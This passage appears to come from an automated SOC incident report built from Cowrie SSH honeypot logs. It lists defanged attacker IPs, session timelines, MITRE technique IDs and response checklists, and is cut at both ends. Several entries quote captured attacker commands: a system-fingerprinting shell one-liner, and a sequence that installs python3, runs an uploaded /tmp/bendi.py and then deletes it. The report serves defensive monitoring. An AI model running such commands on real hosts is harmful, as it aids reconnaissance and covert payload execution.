- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e0b4109a0d1

| Field | Detail |
|---|---|
| **Source IP** | `65.20.251[.]41` |
| **First Seen** | 2026-07-11 11:55 |
| **Last Seen** | 2026-07-11 11:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:55:46` | `cowrie.session.connect` |
| `2026-07-11 11:55:47` | `cowrie.client.version` |
| `2026-07-11 11:55:47` | `cowrie.client.kex` |
| `2026-07-11 11:55:48` | `cowrie.login.success` |
| `2026-07-11 11:55:49` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:55:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.251[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.251[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cfd8b4be345

| Field | Detail |
|---|---|
| **Source IP** | `191.241.142[.]170` |
| **First Seen** | 2026-07-11 11:55 |
| **Last Seen** | 2026-07-11 11:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:55:54` | `cowrie.session.connect` |
| `2026-07-11 11:55:55` | `cowrie.client.version` |
| `2026-07-11 11:55:55` | `cowrie.client.kex` |
| `2026-07-11 11:55:57` | `cowrie.login.success` |
| `2026-07-11 11:55:58` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:56:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.241.142[.]170` to AbuseIPDB if not already reported
- [ ] Block `191.241.142[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2159c00350df

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:56 |
| **Last Seen** | 2026-07-11 11:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:56:26` | `cowrie.session.connect` |
| `2026-07-11 11:56:26` | `cowrie.client.version` |
| `2026-07-11 11:56:26` | `cowrie.client.kex` |
| `2026-07-11 11:56:28` | `cowrie.login.success` |
| `2026-07-11 11:56:29` | `cowrie.session.params` |
| `2026-07-11 11:56:29` | `cowrie.command.input` |
| `2026-07-11 11:56:29` | `cowrie.command.input` |
| `2026-07-11 11:56:29` | `cowrie.command.input` |
| `2026-07-11 11:56:29` | `cowrie.command.input` |
| `2026-07-11 11:56:29` | `cowrie.command.input` |
| `2026-07-11 11:56:29` | `cowrie.command.success` |
| `2026-07-11 11:56:29` | `cowrie.command.input` |
| `2026-07-11 11:56:29` | `cowrie.command.input` |
| `2026-07-11 11:56:29` | `cowrie.command.input` |
| `2026-07-11 11:56:29` | `cowrie.command.input` |
| `2026-07-11 11:56:29` | `cowrie.log.closed` |
| `2026-07-11 11:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b61c9259334c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:58 |
| **Last Seen** | 2026-07-11 11:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:58:10` | `cowrie.session.connect` |
| `2026-07-11 11:58:10` | `cowrie.client.version` |
| `2026-07-11 11:58:10` | `cowrie.client.kex` |
| `2026-07-11 11:58:12` | `cowrie.login.success` |
| `2026-07-11 11:58:13` | `cowrie.session.params` |
| `2026-07-11 11:58:13` | `cowrie.command.input` |
| `2026-07-11 11:58:13` | `cowrie.command.input` |
| `2026-07-11 11:58:13` | `cowrie.command.input` |
| `2026-07-11 11:58:13` | `cowrie.command.input` |
| `2026-07-11 11:58:13` | `cowrie.command.input` |
| `2026-07-11 11:58:13` | `cowrie.command.success` |
| `2026-07-11 11:58:13` | `cowrie.command.input` |
| `2026-07-11 11:58:13` | `cowrie.command.input` |
| `2026-07-11 11:58:13` | `cowrie.command.input` |
| `2026-07-11 11:58:13` | `cowrie.command.input` |
| `2026-07-11 11:58:13` | `cowrie.log.closed` |
| `2026-07-11 11:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d27b9ec39bb5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:59 |
| **Last Seen** | 2026-07-11 11:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:59:55` | `cowrie.session.connect` |
| `2026-07-11 11:59:55` | `cowrie.client.version` |
| `2026-07-11 11:59:55` | `cowrie.client.kex` |
| `2026-07-11 11:59:57` | `cowrie.login.success` |
| `2026-07-11 11:59:58` | `cowrie.session.params` |
| `2026-07-11 11:59:58` | `cowrie.command.input` |
| `2026-07-11 11:59:58` | `cowrie.command.input` |
| `2026-07-11 11:59:58` | `cowrie.command.input` |
| `2026-07-11 11:59:58` | `cowrie.command.input` |
| `2026-07-11 11:59:58` | `cowrie.command.input` |
| `2026-07-11 11:59:58` | `cowrie.command.success` |
| `2026-07-11 11:59:58` | `cowrie.command.input` |
| `2026-07-11 11:59:58` | `cowrie.command.input` |
| `2026-07-11 11:59:58` | `cowrie.command.input` |
| `2026-07-11 11:59:58` | `cowrie.command.input` |
| `2026-07-11 11:59:58` | `cowrie.log.closed` |
| `2026-07-11 11:59:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3206a66712c

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-11 12:00 |
| **Last Seen** | 2026-07-11 12:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:00:10` | `cowrie.session.connect` |
| `2026-07-11 12:00:10` | `cowrie.client.version` |
| `2026-07-11 12:00:10` | `cowrie.client.kex` |
| `2026-07-11 12:00:10` | `cowrie.login.success` |
| `2026-07-11 12:00:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c34a35427acf

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-11 12:00 |
| **Last Seen** | 2026-07-11 12:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:00:10` | `cowrie.session.connect` |
| `2026-07-11 12:00:10` | `cowrie.client.version` |
| `2026-07-11 12:00:10` | `cowrie.client.kex` |
| `2026-07-11 12:00:11` | `cowrie.login.success` |
| `2026-07-11 12:00:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5c283a91490

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-11 12:00 |
| **Last Seen** | 2026-07-11 12:02 |
| **Session Duration** | 128s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:00:31` | `cowrie.session.connect` |
| `2026-07-11 12:00:31` | `cowrie.client.version` |
| `2026-07-11 12:00:31` | `cowrie.client.kex` |
| `2026-07-11 12:00:31` | `cowrie.login.success` |
| `2026-07-11 12:00:32` | `cowrie.session.file_upload` |
| `2026-07-11 12:00:32` | `cowrie.session.params` |
| `2026-07-11 12:00:32` | `cowrie.command.input` |
| `2026-07-11 12:00:32` | `cowrie.command.input` |
| `2026-07-11 12:00:32` | `cowrie.command.input` |
| `2026-07-11 12:00:32` | `cowrie.command.failed` |
| `2026-07-11 12:00:33` | `cowrie.log.closed` |
| `2026-07-11 12:00:33` | `cowrie.session.params` |
| `2026-07-11 12:00:33` | `cowrie.command.input` |
| `2026-07-11 12:00:33` | `cowrie.log.closed` |
| `2026-07-11 12:00:34` | `cowrie.session.params` |
| `2026-07-11 12:00:34` | `cowrie.command.input` |
| `2026-07-11 12:00:34` | `cowrie.log.closed` |
| `2026-07-11 12:00:35` | `cowrie.session.params` |
| `2026-07-11 12:00:35` | `cowrie.command.input` |
| `2026-07-11 12:00:35` | `cowrie.command.failed` |
| `2026-07-11 12:00:35` | `cowrie.command.failed` |
| `2026-07-11 12:01:36` | `cowrie.session.params` |
| `2026-07-11 12:01:36` | `cowrie.command.input` |
| `2026-07-11 12:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98fe4fb5fe97

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 12:01 |
| **Last Seen** | 2026-07-11 12:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:01:43` | `cowrie.session.connect` |
| `2026-07-11 12:01:43` | `cowrie.client.version` |
| `2026-07-11 12:01:43` | `cowrie.client.kex` |
| `2026-07-11 12:01:44` | `cowrie.login.success` |
| `2026-07-11 12:01:45` | `cowrie.session.params` |
| `2026-07-11 12:01:45` | `cowrie.command.input` |
| `2026-07-11 12:01:45` | `cowrie.command.input` |
| `2026-07-11 12:01:45` | `cowrie.command.input` |
| `2026-07-11 12:01:45` | `cowrie.command.input` |
| `2026-07-11 12:01:45` | `cowrie.command.input` |
| `2026-07-11 12:01:45` | `cowrie.command.success` |
| `2026-07-11 12:01:45` | `cowrie.command.input` |
| `2026-07-11 12:01:45` | `cowrie.command.input` |
| `2026-07-11 12:01:45` | `cowrie.command.input` |
| `2026-07-11 12:01:45` | `cowrie.command.input` |
| `2026-07-11 12:01:46` | `cowrie.log.closed` |
| `2026-07-11 12:01:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e3971433550

| Field | Detail |
|---|---|
| **Source IP** | `50.187.155[.]130` |
| **First Seen** | 2026-07-11 12:02 |
| **Last Seen** | 2026-07-11 12:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:02:11` | `cowrie.session.connect` |
| `2026-07-11 12:02:13` | `cowrie.client.version` |
| `2026-07-11 12:02:13` | `cowrie.client.kex` |
| `2026-07-11 12:02:14` | `cowrie.login.success` |
| `2026-07-11 12:02:14` | `cowrie.direct-tcpip.request` |
| `2026-07-11 12:02:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.187.155[.]130` to AbuseIPDB if not already reported
- [ ] Block `50.187.155[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef949d7157b5

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-11 12:02 |
| **Last Seen** | 2026-07-11 12:05 |
| **Session Duration** | 125s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:02:54` | `cowrie.session.connect` |
| `2026-07-11 12:02:54` | `cowrie.client.version` |
| `2026-07-11 12:02:54` | `cowrie.client.kex` |
| `2026-07-11 12:02:54` | `cowrie.login.success` |
| `2026-07-11 12:02:56` | `cowrie.session.file_upload` |
| `2026-07-11 12:02:56` | `cowrie.session.params` |
| `2026-07-11 12:02:56` | `cowrie.command.input` |
| `2026-07-11 12:02:56` | `cowrie.command.input` |
| `2026-07-11 12:02:56` | `cowrie.command.input` |
| `2026-07-11 12:02:56` | `cowrie.command.failed` |
| `2026-07-11 12:02:56` | `cowrie.log.closed` |
| `2026-07-11 12:02:57` | `cowrie.session.params` |
| `2026-07-11 12:02:57` | `cowrie.command.input` |
| `2026-07-11 12:02:57` | `cowrie.log.closed` |
| `2026-07-11 12:02:58` | `cowrie.session.params` |
| `2026-07-11 12:02:58` | `cowrie.command.input` |
| `2026-07-11 12:02:58` | `cowrie.log.closed` |
| `2026-07-11 12:02:59` | `cowrie.session.params` |
| `2026-07-11 12:02:59` | `cowrie.command.input` |
| `2026-07-11 12:02:59` | `cowrie.command.failed` |
| `2026-07-11 12:02:59` | `cowrie.command.failed` |
| `2026-07-11 12:03:59` | `cowrie.session.params` |
| `2026-07-11 12:03:59` | `cowrie.command.input` |
| `2026-07-11 12:05:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12c22b0784e0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 12:03 |
| **Last Seen** | 2026-07-11 12:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:03:30` | `cowrie.session.connect` |
| `2026-07-11 12:03:31` | `cowrie.client.version` |
| `2026-07-11 12:03:31` | `cowrie.client.kex` |
| `2026-07-11 12:03:31` | `cowrie.login.success` |
| `2026-07-11 12:03:32` | `cowrie.session.params` |
| `2026-07-11 12:03:32` | `cowrie.command.input` |
| `2026-07-11 12:03:32` | `cowrie.command.input` |
| `2026-07-11 12:03:32` | `cowrie.command.input` |
| `2026-07-11 12:03:32` | `cowrie.command.input` |
| `2026-07-11 12:03:32` | `cowrie.command.input` |
| `2026-07-11 12:03:32` | `cowrie.command.success` |
| `2026-07-11 12:03:32` | `cowrie.command.input` |
| `2026-07-11 12:03:32` | `cowrie.command.input` |
| `2026-07-11 12:03:32` | `cowrie.command.input` |
| `2026-07-11 12:03:32` | `cowrie.command.input` |
| `2026-07-11 12:03:33` | `cowrie.log.closed` |
| `2026-07-11 12:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b24764bd978f

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 12:05 |
| **Last Seen** | 2026-07-11 12:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:05:10` | `cowrie.session.connect` |
| `2026-07-11 12:05:10` | `cowrie.client.version` |
| `2026-07-11 12:05:10` | `cowrie.client.kex` |
| `2026-07-11 12:05:11` | `cowrie.login.success` |
| `2026-07-11 12:05:11` | `cowrie.session.params` |
| `2026-07-11 12:05:11` | `cowrie.command.input` |
| `2026-07-11 12:05:12` | `cowrie.log.closed` |
| `2026-07-11 12:05:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f295d7b300e2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 12:05 |
| **Last Seen** | 2026-07-11 12:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:05:19` | `cowrie.session.connect` |
| `2026-07-11 12:05:19` | `cowrie.client.version` |
| `2026-07-11 12:05:19` | `cowrie.client.kex` |
| `2026-07-11 12:05:20` | `cowrie.login.success` |
| `2026-07-11 12:05:20` | `cowrie.session.params` |
| `2026-07-11 12:05:20` | `cowrie.command.input` |
| `2026-07-11 12:05:20` | `cowrie.command.input` |
| `2026-07-11 12:05:20` | `cowrie.command.input` |
| `2026-07-11 12:05:20` | `cowrie.command.input` |
| `2026-07-11 12:05:20` | `cowrie.command.input` |
| `2026-07-11 12:05:20` | `cowrie.command.success` |
| `2026-07-11 12:05:20` | `cowrie.command.input` |
| `2026-07-11 12:05:20` | `cowrie.command.input` |
| `2026-07-11 12:05:20` | `cowrie.command.input` |
| `2026-07-11 12:05:20` | `cowrie.command.input` |
| `2026-07-11 12:05:21` | `cowrie.log.closed` |
| `2026-07-11 12:05:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-708c76460a4f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 12:07 |
| **Last Seen** | 2026-07-11 12:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:07:06` | `cowrie.session.connect` |
| `2026-07-11 12:07:06` | `cowrie.client.version` |
| `2026-07-11 12:07:06` | `cowrie.client.kex` |
| `2026-07-11 12:07:07` | `cowrie.login.success` |
| `2026-07-11 12:07:08` | `cowrie.session.params` |
| `2026-07-11 12:07:08` | `cowrie.command.input` |
| `2026-07-11 12:07:08` | `cowrie.command.input` |
| `2026-07-11 12:07:08` | `cowrie.command.input` |
| `2026-07-11 12:07:08` | `cowrie.command.input` |
| `2026-07-11 12:07:08` | `cowrie.command.input` |
| `2026-07-11 12:07:08` | `cowrie.command.success` |
| `2026-07-11 12:07:08` | `cowrie.command.input` |
| `2026-07-11 12:07:08` | `cowrie.command.input` |
| `2026-07-11 12:07:08` | `cowrie.command.input` |
| `2026-07-11 12:07:08` | `cowrie.command.input` |
| `2026-07-11 12:07:08` | `cowrie.log.closed` |
| `2026-07-11 12:07:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7d3e729074a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 12:08 |
| **Last Seen** | 2026-07-11 12:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:08:57` | `cowrie.session.connect` |
| `2026-07-11 12:08:57` | `cowrie.client.version` |
| `2026-07-11 12:08:58` | `cowrie.client.kex` |
| `2026-07-11 12:08:58` | `cowrie.login.success` |
| `2026-07-11 12:08:59` | `cowrie.session.params` |
